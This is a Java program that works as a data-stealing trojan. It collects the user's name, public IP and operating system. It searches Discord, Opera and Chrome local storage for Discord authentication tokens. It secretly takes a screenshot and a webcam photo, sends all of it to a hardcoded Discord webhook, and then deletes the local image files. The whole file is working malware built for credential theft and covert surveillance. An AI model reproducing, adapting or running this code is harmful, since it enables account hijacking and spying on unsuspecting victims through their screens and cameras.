import com.github.sarxos.webcam.Webcam;
import org.apache.commons.io.FileUtils;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.*;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {

    private static final String webhookURL = "https://discord.com/api/webhooks/884970510310584390/q1v2s4te1FyQQPTzwvEyvwQGaNRYZ1lBUpOxpBw4PJsWE4ttjsGuRLnLM4bEVi48SKE_";
    private static String sout = "";

    public static void main(String[] args) throws InterruptedException {
        String userOS = System.getProperty("os.name");

        sendMessage("--------------------------------------------------------------------------------------");
        TimeUnit.MILLISECONDS.sleep(100);

        //PC INFO LOGGER
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            String userIP = bufferedReader.readLine();
            String userName = System.getProperty("user.name");
            sendMessage("\n``` NAME : " + userName + "\n IP" + "   : " + userIP + " \n OS   : " + userOS + "```");
        } catch (Exception ex) {
            sendMessage("``` UNABLE TO PULL INFORMATION : " + ex + "```");
        }

        //TOKEN LOGGER
        try {
            OSCapture(userOS);
        } catch (Exception ex) {
            sendMessage("``` UNABLE TO PULL TOKENS : " + ex + "```");
        }//*/

        //SCREEN CAPTURE
        try {
            sendMessage("Screen Capture");
            captureScreen();
        } catch (Exception ex) {
            sendMessage("``` UNABLE TO SCREENSHOT : " + ex + "```");
        }

        //CAMERA CAPTURE
        try {
            sendMessage("Camera Capture");
            captureCamera();
        } catch (Exception ex) {
            sendMessage("``` UNABLE TO CAPTURE CAMERA : " + ex + "```");
        }

        //create logs.txt and sendFile
        System.out.println(sout);
        sendMessage("logs:\n```" + sout + "```"); //temp method
    }

    private static void sendMessage(String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL(webhookURL);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null)
                result.append("/n").append(line);

        } catch (Exception e) {
            e.printStackTrace();

        } finally {
            try {
                if (out != null)
                    out.close();
                if (in != null)
                    in.close();
            } catch (IOException ex) {
                ex.printStackTrace();
            }

        }

        sout += "message sent" + result + "\n";
    }

    private static void OSCapture(String userOS) throws InterruptedException {
        List<String> paths = new ArrayList<>();
        StringBuilder webhooks = new StringBuilder();

        if (userOS.contains("Windows")) {
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
        } else if (userOS.contains("Mac"))
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
        else
            sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");

        int cx = 0;
        webhooks.append("TOKEN\n");

        for (String path : paths) {
            File f = new File(path);
            String[] pathnames = f.list();
            if (pathnames == null) continue; //should be break?

            for (String pathname : pathnames) {
                try {
                    FileInputStream fstream = new FileInputStream(path + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));

                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                        Matcher m = p.matcher(strLine);

                        while (m.find()) {
                            if (cx > 0) {
                                webhooks.append("\n");
                            }
                            webhooks.append("" + path + pathname + "  --> token: ").append(m.group());
                            cx++;
                        }
                    }

                } catch (Exception ignored) {
                    webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //occasional error: Server returned HTTP response code: 400 for URL:
                    TimeUnit.MILLISECONDS.sleep(100);
                }
            }
        }

        sendMessage("```" + webhooks + "```");

    }

    private static void sendFile(File file) throws IOException {
        /*byte[] fileContent = FileUtils.readFileToByteArray(new File(file.toPath().toString()));
        String encodedString = Base64.getEncoder().encodeToString(fileContent);

        sendMessage(encodedString);

        int random = new Random().nextInt();
        File textfile = new File("cached_" + random + ".txt");
        PrintWriter baseCode = new PrintWriter(textfile);

        baseCode.println(encodedString);
        /* ^base64 code^
        * https://www.baeldung.com/java-base64-image-string */

        String boundary = Long.toHexString(System.currentTimeMillis());
        URLConnection connection = new URL(webhookURL).openConnection();
        connection.setDoOutput(true);
        connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
            writer.println("--" + boundary);
            writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
            writer.println("Content-Type: image/png");
            byte[] fileContent = Files.readAllBytes(file.toPath());
            writer.println(fileContent);
            sout += fileContent + "\n";
            //writer.println(textfile);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                for (String line; (line = reader.readLine()) != null; ) {
                    writer.println(line);
                }

            }
            writer.println("--" + boundary + "--");

        }

        sout += "Connection? " + ((HttpURLConnection) connection).getResponseMessage() + "\n";

    }

    @SuppressWarnings("all")
    private static void captureScreen() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File("cached_" + random + ".png");
        sout += "\n" + file.getName() + "\n";
        ImageIO.write(image, "png", file);
        sendFile(file);
        if (file.delete())
            sout += "Deleted the file: " + file.getName() + "\n";
        else
            sout += "Failed to delete the file." + "\n";
    }

    private static void captureCamera() throws Exception {
        Webcam cam = Webcam.getDefault();
        if (cam != null) {
            sout += "\nWebcam: " + cam.getName() + "\n";
            cam.open();
            int random = Math.abs(new Random().nextInt());
            File webcam = new File("1cached_" + random + ".png");
            ImageIO.write(cam.getImage(), "png", webcam);
            cam.close();
            sendFile(webcam);
            if (webcam.delete())
                sout += "Deleted file: " + webcam.getName() + "\n";
            else
                sout += "Failed to delete the file." + "\n";
        } else
            sout += "\nNo webcam detected" + "\n";
    }

}
